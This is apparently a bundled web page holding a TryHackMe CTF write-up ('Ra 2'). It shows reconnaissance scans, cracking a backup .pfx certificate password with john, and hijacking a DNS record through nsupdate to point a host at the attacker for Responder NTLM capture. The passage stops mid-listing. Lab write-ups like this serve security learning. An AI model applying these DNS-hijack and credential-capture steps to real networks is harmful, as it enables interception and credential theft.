"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8326],{3905:(e,n,t)=>{t.d(n,{Zo:()=>p,kt:()=>T});var r=t(67294);function s(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){s(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,s=function(e,n){if(null==e)return{};var t,r,s={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(s[t]=e[t]);return s}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(s[t]=e[t])}return s}var c=r.createContext({}),l=function(e){var n=r.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},p=function(e){var n=l(e.components);return r.createElement(c.Provider,{value:n},e.children)},d="mdxType",h={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,s=e.mdxType,a=e.originalType,c=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),d=l(t),m=s,T=d["".concat(c,".").concat(m)]||d[m]||h[m]||a;return t?r.createElement(T,o(o({ref:n},p),{},{components:t})):r.createElement(T,o({ref:n},p))}));function T(e,n){var t=arguments,s=n&&n.mdxType;if("string"==typeof e||s){var a=t.length,o=new Array(a);o[0]=m;var i={};for(var c in n)hasOwnProperty.call(n,c)&&(i[c]=n[c]);i.originalType=e,i[d]="string"==typeof e?e:s,o[1]=i;for(var l=2;l<a;l++)o[l]=t[l];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},11179:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>h,frontMatter:()=>a,metadata:()=>i,toc:()=>l});var r=t(87462),s=(t(67294),t(3905));const a={},o="Ra 2",i={unversionedId:"Tryhackme/Ra 2/Ra 2",id:"Tryhackme/Ra 2/Ra 2",title:"Ra 2",description:"Just when they thought their hashes were safe... Ra 2 - The sequel!",source:"@site/writeups/Tryhackme/Ra 2/Ra 2.md",sourceDirName:"Tryhackme/Ra 2",slug:"/Tryhackme/Ra 2/",permalink:"/writeups/Tryhackme/Ra 2/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Ra",permalink:"/writeups/Tryhackme/Ra/"},next:{title:"Racetrack Bank",permalink:"/writeups/Tryhackme/Racetrack Bank/"}},c={},l=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Ra 2",id:"task-1-ra-2",level:2}],p={toc:l},d="wrapper";function h(e){let{components:n,...a}=e;return(0,s.kt)(d,(0,r.Z)({},p,a,{components:n,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"ra-2"},"Ra 2"),(0,s.kt)("p",null,"Just when they thought their hashes were safe... Ra 2 - The sequel!"),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/ra2"},"Ra 2")),(0,s.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,s.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,s.kt)("li",{parentName:"ul"},"DNS Enumeration"),(0,s.kt)("li",{parentName:"ul"},"Brute Forcing (pfx)"),(0,s.kt)("li",{parentName:"ul"},"Brute Forcing (NTML)"),(0,s.kt)("li",{parentName:"ul"},"Abusing Impersonation Privileges (PrintSpoofer)")),(0,s.kt)("hr",null),(0,s.kt)("h2",{id:"task-1-ra-2"},"Task 1 Ra 2"),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"Story")),(0,s.kt)("p",null,"WindCorp recently had a security-breach. Since then they have hardened their infrastructure, learning from their mistakes. But maybe not enough? You have managed to enter their local network..."),(0,s.kt)("p",null,"Happy Hacking!"),(0,s.kt)("p",null,"Created by @4nqr34z and @theart42"),(0,s.kt)("p",null,"(Give it at least 5 minutes to boot)"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Ra 2$ sudo nmap -A -sS -sC -sV -O 10.10.34.115\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-17 22:11 CEST\nNmap scan report for 10.10.34.115\nHost is up (0.061s latency).\nNot shown: 978 filtered ports\nPORT     STATE SERVICE             VERSION\n53/tcp   open  domain?\n| fingerprint-strings:\n|   DNSVersionBindReqTCP:\n|     version\n|_    bind\n80/tcp   open  http                Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Did not follow redirect to https://fire.windcorp.thm/\n88/tcp   open  kerberos-sec        Microsoft Windows Kerberos (server time: 2020-10-17 20:11:36Z)\n135/tcp  open  msrpc               Microsoft Windows RPC\n139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn\n389/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=fire.windcorp.thm\n| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm\n| Not valid before: 2020-05-29T03:31:08\n|_Not valid after:  2028-05-29T03:41:03\n|_ssl-date: 2020-10-17T20:14:44+00:00; +1s from scanner time.\n443/tcp  open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n| ssl-cert: Subject: commonName=fire.windcorp.thm\n| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm\n| Not valid before: 2020-05-29T03:31:08\n|_Not valid after:  2028-05-29T03:41:03\n|_ssl-date: 2020-10-17T20:14:41+00:00; +1s from scanner time.\n| tls-alpn:\n|_  http/1.1\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=fire.windcorp.thm\n| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm\n| Not valid before: 2020-05-29T03:31:08\n|_Not valid after:  2028-05-29T03:41:03\n|_ssl-date: 2020-10-17T20:14:41+00:00; +1s from scanner time.\n2179/tcp open  vmrdp?\n3268/tcp open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=fire.windcorp.thm\n| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm\n| Not valid before: 2020-05-29T03:31:08\n|_Not valid after:  2028-05-29T03:41:03\n|_ssl-date: 2020-10-17T20:14:44+00:00; +1s from scanner time.\n3269/tcp open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=fire.windcorp.thm\n| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm\n| Not valid before: 2020-05-29T03:31:08\n|_Not valid after:  2028-05-29T03:41:03\n|_ssl-date: 2020-10-17T20:14:41+00:00; 0s from scanner time.\n3389/tcp open  ms-wbt-server       Microsoft Terminal Services\n| rdp-ntlm-info:\n|   Target_Name: WINDCORP\n|   NetBIOS_Domain_Name: WINDCORP\n|   NetBIOS_Computer_Name: FIRE\n|   DNS_Domain_Name: windcorp.thm\n|   DNS_Computer_Name: Fire.windcorp.thm\n|   DNS_Tree_Name: windcorp.thm\n|   Product_Version: 10.0.17763\n|_  System_Time: 2020-10-17T20:14:00+00:00\n| ssl-cert: Subject: commonName=Fire.windcorp.thm\n| Not valid before: 2020-10-16T20:11:18\n|_Not valid after:  2021-04-17T20:11:18\n|_ssl-date: 2020-10-17T20:14:44+00:00; +1s from scanner time.\n5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later\n| xmpp-info:\n|   STARTTLS Failed\n|   info:\n|     unknown:\n|\n|     stream_id: 6j0chmpuz9\n|     xmpp:\n|       version: 1.0\n|     features:\n|\n|     errors:\n|       invalid-namespace\n|       (timeout)\n|     capabilities:\n|\n|     auth_mechanisms:\n|\n|_    compression_methods:\n5269/tcp open  xmpp                Wildfire XMPP Client\n| xmpp-info:\n|   STARTTLS Failed\n|   info:\n|     auth_mechanisms:\n|\n|     xmpp:\n|\n|     features:\n|\n|     errors:\n|       (timeout)\n|     capabilities:\n|\n|     unknown:\n|\n|_    compression_methods:\n7070/tcp open  http                Jetty 9.4.18.v20190429\n|_http-server-header: Jetty(9.4.18.v20190429)\n|_http-title: Openfire HTTP Binding Service\n7443/tcp open  ssl/http            Jetty 9.4.18.v20190429\n|_http-server-header: Jetty(9.4.18.v20190429)\n|_http-title: Openfire HTTP Binding Service\n| ssl-cert: Subject: commonName=fire.windcorp.thm\n| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm\n| Not valid before: 2020-05-01T08:39:00\n|_Not valid after:  2025-04-30T08:39:00\n7777/tcp open  socks5              (No authentication; connection failed)\n| socks-auth-info:\n|_  No authentication\n9090/tcp open  zeus-admin?\n| fingerprint-strings:\n|   GetRequest:\n|     HTTP/1.1 200 OK\n|     Date: Sat, 17 Oct 2020 20:11:36 GMT\n|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT\n|     Content-Type: text/html\n|     Accept-Ranges: bytes\n|     Content-Length: 115\n|     <html>\n|     <head><title></title>\n|     <meta http-equiv="refresh" content="0;URL=index.jsp">\n|     </head>\n|     <body>\n|     </body>\n|     </html>\n|   HTTPOptions:\n|     HTTP/1.1 200 OK\n|     Date: Sat, 17 Oct 2020 20:11:42 GMT\n|     Allow: GET,HEAD,POST,OPTIONS\n|   JavaRMI, drda, ibm-db2-das, informix:\n|     HTTP/1.1 400 Illegal character CNTL=0x0\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 69\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>\n|   SqueezeCenter_CLI:\n|     HTTP/1.1 400 No URI\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 49\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>\n|   WMSRequest:\n|     HTTP/1.1 400 Illegal character CNTL=0x1\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 69\n|     Connection: close\n|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>\n9091/tcp open  ssl/xmltec-xmlmail?\n| fingerprint-strings:\n|   DNSStatusRequestTCP, DNSVersionBindReqTCP:\n|     HTTP/1.1 400 Illegal character CNTL=0x0\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 69\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>\n|   GetRequest:\n|     HTTP/1.1 200 OK\n|     Date: Sat, 17 Oct 2020 20:11:59 GMT\n|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT\n|     Content-Type: text/html\n|     Accept-Ranges: bytes\n|     Content-Length: 115\n|     <html>\n|     <head><title></title>\n|     <meta http-equiv="refresh" content="0;URL=index.jsp">\n|     </head>\n|     <body>\n|     </body>\n|     </html>\n|   HTTPOptions:\n|     HTTP/1.1 200 OK\n|     Date: Sat, 17 Oct 2020 20:11:59 GMT\n|     Allow: GET,HEAD,POST,OPTIONS\n|   Help:\n|     HTTP/1.1 400 No URI\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 49\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>\n|   RPCCheck:\n|     HTTP/1.1 400 Illegal character OTEXT=0x80\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 71\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>\n|   RTSPRequest:\n|     HTTP/1.1 400 Unknown Version\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 58\n|     Connection: close\n|     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>\n|   SSLSessionReq:\n|     HTTP/1.1 400 Illegal character CNTL=0x16\n|     Content-Type: text/html;charset=iso-8859-1\n|     Content-Length: 70\n|     Connection: close\n|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>\n| ssl-cert: Subject: commonName=fire.windcorp.thm\n| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm\n| Not valid before: 2020-05-01T08:39:00\n|_Not valid after:  2025-04-30T08:39:00\n3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port53-TCP:V=7.80%I=7%D=10/17%Time=5F8B4FFC%P=x86_64-pc-linux-gnu%r(DNS\nSF:VersionBindReqTCP,20,"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\nSF:\\x04bind\\0\\0\\x10\\0\\x03");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port9090-TCP:V=7.80%I=7%D=10/17%Time=5F8B4FF8%P=x86_64-pc-linux-gnu%r(G\nSF:etRequest,11D,"HTTP/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Sat,\\x2017\\x20Oct\\x20\nSF:2020\\x2020:11:36\\x20GMT\\r\\nLast-Modified:\\x20Fri,\\x2031\\x20Jan\\x202020\\\nSF:x2017:54:10\\x20GMT\\r\\nContent-Type:\\x20text/html\\r\\nAccept-Ranges:\\x20b\nSF:ytes\\r\\nContent-Length:\\x20115\\r\\n\\r\\n<html>\\n<head><title></title>\\n<m\nSF:eta\\x20http-equiv=\\"refresh\\"\\x20content=\\"0;URL=index\\.jsp\\">\\n</head>\nSF:\\n<body>\\n</body>\\n</html>\\n\\n")%r(JavaRMI,C3,"HTTP/1\\.1\\x20400\\x20Ille\nSF:gal\\x20character\\x20CNTL=0x0\\r\\nContent-Type:\\x20text/html;charset=iso-\nSF:8859-1\\r\\nContent-Length:\\x2069\\r\\nConnection:\\x20close\\r\\n\\r\\n<h1>Bad\\\nSF:x20Message\\x20400</h1><pre>reason:\\x20Illegal\\x20character\\x20CNTL=0x0<\nSF:/pre>")%r(WMSRequest,C3,"HTTP/1\\.1\\x20400\\x20Illegal\\x20character\\x20CN\nSF:TL=0x1\\r\\nContent-Type:\\x20text/html;charset=iso-8859-1\\r\\nContent-Leng\nSF:th:\\x2069\\r\\nConnection:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x20400</h1>\nSF:<pre>reason:\\x20Illegal\\x20character\\x20CNTL=0x1</pre>")%r(ibm-db2-das,\nSF:C3,"HTTP/1\\.1\\x20400\\x20Illegal\\x20character\\x20CNTL=0x0\\r\\nContent-Typ\nSF:e:\\x20text/html;charset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nConnecti\nSF:on:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20Illeg\nSF:al\\x20character\\x20CNTL=0x0</pre>")%r(SqueezeCenter_CLI,9B,"HTTP/1\\.1\\x\nSF:20400\\x20No\\x20URI\\r\\nContent-Type:\\x20text/html;charset=iso-8859-1\\r\\n\nSF:Content-Length:\\x2049\\r\\nConnection:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\nSF:\\x20400</h1><pre>reason:\\x20No\\x20URI</pre>")%r(informix,C3,"HTTP/1\\.1\\\nSF:x20400\\x20Illegal\\x20character\\x20CNTL=0x0\\r\\nContent-Type:\\x20text/htm\nSF:l;charset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nConnection:\\x20close\\r\nSF:\\n\\r\\n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20Illegal\\x20characte\nSF:r\\x20CNTL=0x0</pre>")%r(drda,C3,"HTTP/1\\.1\\x20400\\x20Illegal\\x20charact\nSF:er\\x20CNTL=0x0\\r\\nContent-Type:\\x20text/html;charset=iso-8859-1\\r\\nCont\nSF:ent-Length:\\x2069\\r\\nConnection:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x20\nSF:400</h1><pre>reason:\\x20Illegal\\x20character\\x20CNTL=0x0</pre>")%r(HTTP\nSF:Options,56,"HTTP/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Sat,\\x2017\\x20Oct\\x20202\nSF:0\\x2020:11:42\\x20GMT\\r\\nAllow:\\x20GET,HEAD,POST,OPTIONS\\r\\n\\r\\n");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port9091-TCP:V=7.80%T=SSL%I=7%D=10/17%Time=5F8B500F%P=x86_64-pc-linux-g\nSF:nu%r(GetRequest,11D,"HTTP/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Sat,\\x2017\\x20O\nSF:ct\\x202020\\x2020:11:59\\x20GMT\\r\\nLast-Modified:\\x20Fri,\\x2031\\x20Jan\\x2\nSF:02020\\x2017:54:10\\x20GMT\\r\\nContent-Type:\\x20text/html\\r\\nAccept-Ranges\nSF::\\x20bytes\\r\\nContent-Length:\\x20115\\r\\n\\r\\n<html>\\n<head><title></titl\nSF:e>\\n<meta\\x20http-equiv=\\"refresh\\"\\x20content=\\"0;URL=index\\.jsp\\">\\n<\nSF:/head>\\n<body>\\n</body>\\n</html>\\n\\n")%r(HTTPOptions,56,"HTTP/1\\.1\\x202\nSF:00\\x20OK\\r\\nDate:\\x20Sat,\\x2017\\x20Oct\\x202020\\x2020:11:59\\x20GMT\\r\\nAl\nSF:low:\\x20GET,HEAD,POST,OPTIONS\\r\\n\\r\\n")%r(RTSPRequest,AD,"HTTP/1\\.1\\x20\nSF:400\\x20Unknown\\x20Version\\r\\nContent-Type:\\x20text/html;charset=iso-885\nSF:9-1\\r\\nContent-Length:\\x2058\\r\\nConnection:\\x20close\\r\\n\\r\\n<h1>Bad\\x20\nSF:Message\\x20400</h1><pre>reason:\\x20Unknown\\x20Version</pre>")%r(RPCChec\nSF:k,C7,"HTTP/1\\.1\\x20400\\x20Illegal\\x20character\\x20OTEXT=0x80\\r\\nContent\nSF:-Type:\\x20text/html;charset=iso-8859-1\\r\\nContent-Length:\\x2071\\r\\nConn\nSF:ection:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20I\nSF:llegal\\x20character\\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HT\nSF:TP/1\\.1\\x20400\\x20Illegal\\x20character\\x20CNTL=0x0\\r\\nContent-Type:\\x20\nSF:text/html;charset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nConnection:\\x2\nSF:0close\\r\\n\\r\\n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20Illegal\\x20\nSF:character\\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\\.1\\x2040\nSF:0\\x20Illegal\\x20character\\x20CNTL=0x0\\r\\nContent-Type:\\x20text/html;cha\nSF:rset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nConnection:\\x20close\\r\\n\\r\\\nSF:n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20Illegal\\x20character\\x20\nSF:CNTL=0x0</pre>")%r(Help,9B,"HTTP/1\\.1\\x20400\\x20No\\x20URI\\r\\nContent-Ty\nSF:pe:\\x20text/html;charset=iso-8859-1\\r\\nContent-Length:\\x2049\\r\\nConnect\nSF:ion:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x20400</h1><pre>reason:\\x20No\\x\nSF:20URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\\.1\\x20400\\x20Illegal\\x20charac\nSF:ter\\x20CNTL=0x16\\r\\nContent-Type:\\x20text/html;charset=iso-8859-1\\r\\nCo\nSF:ntent-Length:\\x2070\\r\\nConnection:\\x20close\\r\\n\\r\\n<h1>Bad\\x20Message\\x\nSF:20400</h1><pre>reason:\\x20Illegal\\x20character\\x20CNTL=0x16</pre>");\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\nNo OS matches for host\nNetwork Distance: 2 hops\nService Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2020-10-17T20:14:02\n|_  start_date: N/A\n\nTRACEROUTE (using port 445/tcp)\nHOP RTT      ADDRESS\n1   58.13 ms 10.8.0.1\n2   63.12 ms 10.10.34.115\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 221.96 seconds\n')),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Ra 2$ nikto -h 10.10.34.115\n- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.34.115\n+ Target Hostname:    10.10.34.115\n+ Target Port:        80\n+ Start Time:         2020-10-17 22:18:21 (GMT2)\n---------------------------------------------------------------------------\n+ Server: Microsoft-IIS/10.0\n+ Retrieved x-powered-by header: ASP.NET\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type\n+ Root page / redirects to: https://fire.windcorp.thm/\n+ Retrieved x-aspnet-version header: 4.0.30319\n+ No CGI Directories found (use '-C all' to force check all possible dirs)\n")),(0,s.kt)("p",null,(0,s.kt)("img",{src:t(94981).Z,width:"724",height:"730"})),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Ra 2$ dig windcorp.thm any @10.10.34.115\n\n; <<>> DiG 9.16.2-Debian <<>> windcorp.thm any @10.10.34.115\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 57046\n;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 3\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4000\n;; QUESTION SECTION:\n;windcorp.thm.                  IN      ANY\n\n;; ANSWER SECTION:\nwindcorp.thm.           600     IN      A       10.10.34.115\nwindcorp.thm.           600     IN      A       10.10.61.88\nwindcorp.thm.           3600    IN      NS      fire.windcorp.thm.\nwindcorp.thm.           3600    IN      SOA     fire.windcorp.thm. hostmaster.windcorp.thm. 291 900 600 86400 3600\nwindcorp.thm.           86400   IN      TXT     "THM{Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources}"\n\n;; ADDITIONAL SECTION:\nfire.windcorp.thm.      3600    IN      A       10.10.34.115\nfire.windcorp.thm.      3600    IN      A       192.168.112.1\n\n;; Query time: 40 msec\n;; SERVER: 10.10.34.115#53(10.10.34.115)\n;; WHEN: Sat Oct 17 22:15:18 CEST 2020\n;; MSG SIZE  rcvd: 318\n')),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Ra 2$ sudo /opt/dirsearch/dirsearch.py -u https://fire.windcorp.thm -E -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 100 -x 400\n  _|. _ _  _  _  _ _|_    v0.4.0\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, asp, aspx, jsp, jspx, html, htm, js | HTTP method: GET | Threads: 20 | Wordlist size: 220520\n\nError Log: /opt/dirsearch/logs/errors-20-10-17_22-17-32.log\n\nTarget: https://fire.windcorp.thm\n\nOutput File: /opt/dirsearch/reports/fire.windcorp.thm/_20-10-17_22-17-34.txt\n\n[22:17:34] Starting:\n[22:17:39] 301 -  153B  - /img  ->  https://fire.windcorp.thm/img/\n[22:17:42] 301 -  153B  - /css  ->  https://fire.windcorp.thm/css/\n[22:17:47] 301 -  156B  - /vendor  ->  https://fire.windcorp.thm/vendor/\n[22:18:03] 301 -  153B  - /IMG  ->  https://fire.windcorp.thm/IMG/\n[22:18:32] 301 -  153B  - /CSS  ->  https://fire.windcorp.thm/CSS/\n[22:18:38] 301 -  153B  - /Img  ->  https://fire.windcorp.thm/Img/\n[22:21:55] 302 -  165B  - /powershell  ->  /powershell/default.aspx?ReturnUrl=%2fpowershell\nCTRL+C detected: Pausing threads, please wait...\n[e]xit / [c]ontinue: e\n\nCanceled by the user\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Ra 2$ sudo /opt/dirsearch/dirsearch.py -u https://selfservice.dev.windcorp.thm -E -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 100 -x 400[sudo] password for kali:\n\n  _|. _ _  _  _  _ _|_    v0.4.0\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, asp, aspx, jsp, jspx, html, htm, js | HTTP method: GET | Threads: 20 | Wordlist size: 220520\n\nError Log: /opt/dirsearch/logs/errors-20-10-17_22-27-02.log\n\nTarget: https://selfservice.dev.windcorp.thm\n\nOutput File: /opt/dirsearch/reports/selfservice.dev.windcorp.thm/_20-10-17_22-27-02.txt\n\n[22:27:02] Starting:\n[22:27:14] 301 -  167B  - /backup  ->  https://selfservice.dev.windcorp.thm/backup/\n[22:27:19] 301 -  167B  - /Backup  ->  https://selfservice.dev.windcorp.thm/Backup/\nCTRL+C detected: Pausing threads, please wait...\n")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://selfservice.dev.windcorp.thm/backup/"},"https://selfservice.dev.windcorp.thm/backup/")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Ra 2$ /usr/share/john/pfx2john.py cert.pfx > hash\nkali@kali:~/CTFs/tryhackme/Ra 2$ john hash --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 256/256 AVX2 8x])\nCost 1 (iteration count) is 2000 for all loaded hashes\nCost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nganteng          (cert.pfx)\n1g 0:00:00:00 DONE (2020-10-17 22:34) 5.882g/s 12047p/s 12047c/s 12047C/s clover..lovers1\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n\nkali@kali:~/CTFs/tryhackme/Ra 2$ openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes\nEnter Import Password:\nkali@kali:~/CTFs/tryhackme/Ra 2$ openssl pkcs12 -in cert.pfx -out crt.pem -clcerts -nokeys\nEnter Import Password:\nkali@kali:~/CTFs/tryhackme/Ra 2$ nsupdate\n> server 10.10.34.115\n> update delete selfservice.windcorp.thm\n> send\n> update add selfservice.windcorp.thm 1234 A 10.8.106.222\n> send\n> quit\nkali@kali:~/CTFs/tryhackme/Ra 2$ dig selfservice.windcorp.thm @10.10.34.115\n\n; <<>> DiG 9.16.2-Debian <<>> selfservice.windcorp.thm @10.10.34.115\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 26719\n;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4000\n;; QUESTION SECTION:\n;selfservice.windcorp.thm.      IN      A\n\n;; ANSWER SECTION:\nselfservice.windcorp.thm. 1234  IN      A       10.8.106.222\n\n;; Query time: 36 msec\n;; SERVER: 10.10.34.115#53(10.10.34.115)\n;; WHEN: Sat Oct 17 22:37:09 CEST 2020\n;; MSG SIZE  rcvd: 69\n\nkali@kali:~/CTFs/tryhackme/Ra 2$\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Ra 2$ ls /usr/share/responder/certs\ngen-self-signed-cert.sh  responder.crt  responder.key\nkali@kali:~/CTFs/tryhackme/Ra 2$ sudo cp *.pem /usr/share/responder/certs\n[sudo] password for kali:\nkali@kali:~/CTFs/tryhackme/Ra 2$ ls /usr/share/responder/certs\ncrt.pem  